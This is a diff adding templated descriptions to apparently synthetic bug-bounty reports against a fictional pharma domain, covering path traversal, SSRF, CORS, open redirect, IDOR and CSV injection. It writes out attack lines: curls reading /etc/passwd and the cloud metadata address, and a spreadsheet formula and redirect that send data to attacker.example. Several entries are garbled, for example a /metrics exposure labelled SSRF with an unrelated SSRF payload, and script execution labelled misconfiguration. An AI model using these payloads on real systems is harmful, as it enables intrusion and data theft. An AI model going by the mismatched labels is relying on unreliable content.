+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://auth.edelquarz-pharma.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: citizen; app version: Portal 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -6756,7 +6807,8 @@
           "offset": "7d 15h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://auth.edelquarz-pharma.foo/console/queue`\n- Preconditions: authenticated user: admin; app version: API v2\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -6912,7 +6964,8 @@
           "offset": "3d 19h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://auth.edelquarz-pharma.foo/api/me`\n- Preconditions: authenticated user: authenticated user; app version: Web 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -7035,7 +7088,8 @@
           "offset": "5d 7h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://auth.edelquarz-pharma.foo/api/me`\n- Preconditions: authenticated user: support agent; app version: Mobile 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -7117,7 +7171,8 @@
           "offset": "0h",
           "message": "Initial report filed with screenshots and logs."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://auth.edelquarz-pharma.foo/api/me`\n- Preconditions: authenticated user: unauthenticated; app version: Auth 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -7245,7 +7300,8 @@
           "offset": "0h",
           "message": "Initial submission with PoC and reproduction steps."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://auth.edelquarz-pharma.foo/api/me`\n- Preconditions: authenticated user: admin; app version: Auth 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -7384,7 +7440,8 @@
           "offset": "13h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.edelquarz-pharma.foo/api/import`\n- Preconditions: authenticated user: support agent; app version: Auth 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -7504,7 +7561,8 @@
           "offset": "3d 4h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://www.edelquarz-pharma.foo/admin/queue`\n- Preconditions: authenticated user: unauthenticated; app version: Portal 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -7644,7 +7702,8 @@
           "offset": "2d 10h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://auth.edelquarz-pharma.foo/export?type=records`\n- Preconditions: authenticated user: radiologist; app version: API 2.3\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -7766,7 +7825,8 @@
           "offset": "5d 12h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://auth.edelquarz-pharma.foo/v2/me`\n- Preconditions: authenticated user: support agent; app version: API v2\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -7889,7 +7949,8 @@
           "offset": "2d 7h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://auth.edelquarz-pharma.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: citizen; app version: Service 1.8\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -7993,7 +8054,8 @@
           "offset": "1d 23h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://auth.edelquarz-pharma.foo/admin/queue`\n- Preconditions: authenticated user: unauthenticated; app version: API v2\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -8125,7 +8187,8 @@
           "offset": "7d 16h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://www.edelquarz-pharma.foo/api/me`\n- Preconditions: authenticated user: citizen; app version: Auth 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -8247,7 +8310,8 @@
           "offset": "5d 20h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://auth.edelquarz-pharma.foo/auth/callback?next=https://evil.foo`\n- Preconditions: authenticated user: unauthenticated; app version: Auth 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -8401,7 +8465,8 @@
           "offset": "2d 11h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.edelquarz-pharma.foo/metrics`\n- Preconditions: authenticated user: radiologist; app version: Service 1.8\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -8556,7 +8621,8 @@
           "offset": "7d 9h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.edelquarz-pharma.foo/import`\n- Preconditions: authenticated user: authenticated user; app version: Web 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -8700,7 +8766,8 @@
           "offset": "7d 4h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://www.edelquarz-pharma.foo/login?returnUrl=https://evil.foo`\n- Preconditions: authenticated user: unauthenticated; app version: API 2.3\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -8836,7 +8903,8 @@
           "offset": "2d 21h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://auth.edelquarz-pharma.foo/api/documents/`\n- Preconditions: authenticated user: admin; app version: Auth 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -8943,7 +9011,8 @@
           "offset": "5d 16h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://www.edelquarz-pharma.foo/statements/`\n- Preconditions: authenticated user: admin; app version: Console 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -9039,7 +9108,8 @@
           "offset": "2d 6h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://www.edelquarz-pharma.foo/auth/callback?next=https://evil.foo`\n- Preconditions: authenticated user: admin; app version: Portal 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -9160,7 +9230,8 @@
           "offset": "3d 7h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://www.edelquarz-pharma.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: admin; app version: Auth 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -9340,7 +9411,8 @@
           "offset": "8d 14h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://www.edelquarz-pharma.foo/console/queue`\n- Preconditions: authenticated user: radiologist; app version: API v2\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -9459,7 +9531,8 @@
           "offset": "15h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://www.edelquarz-pharma.foo/api/me`\n- Preconditions: authenticated user: authenticated user; app version: Service 1.8\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -9611,7 +9684,8 @@
           "offset": "4d 18h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://auth.edelquarz-pharma.foo/export?type=records`\n- Preconditions: authenticated user: admin; app version: Auth 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -9716,7 +9790,8 @@
           "offset": "2d 17h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.edelquarz-pharma.foo/metrics`\n- Preconditions: authenticated user: unauthenticated; app version: Console 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -9860,7 +9935,8 @@
           "offset": "1d 8h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://www.edelquarz-pharma.foo/api/documents/`\n- Preconditions: authenticated user: support agent; app version: Web 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -9968,7 +10044,8 @@
           "offset": "0h",
           "message": "Initial submission with PoC and reproduction steps."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://api.edelquarz-pharma.foo/api/import`\n- Preconditions: authenticated user: radiologist; app version: Console 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -10147,7 +10224,8 @@
           "offset": "8d 13h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://api.edelquarz-pharma.foo/fetch`\n- Preconditions: authenticated user: support agent; app version: API v2\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -10283,7 +10361,8 @@
           "offset": "1d 23h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://portal.edelquarz-pharma.foo/import`\n- Preconditions: authenticated user: unauthenticated; app version: Mobile 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -10450,7 +10529,8 @@
           "offset": "3d 11h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://api.edelquarz-pharma.foo/import`\n- Preconditions: authenticated user: admin; app version: Portal 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -10593,7 +10673,8 @@
           "offset": "5d 19h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://api.edelquarz-pharma.foo/api/import`\n- Preconditions: authenticated user: unauthenticated; app version: Service 1.8\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
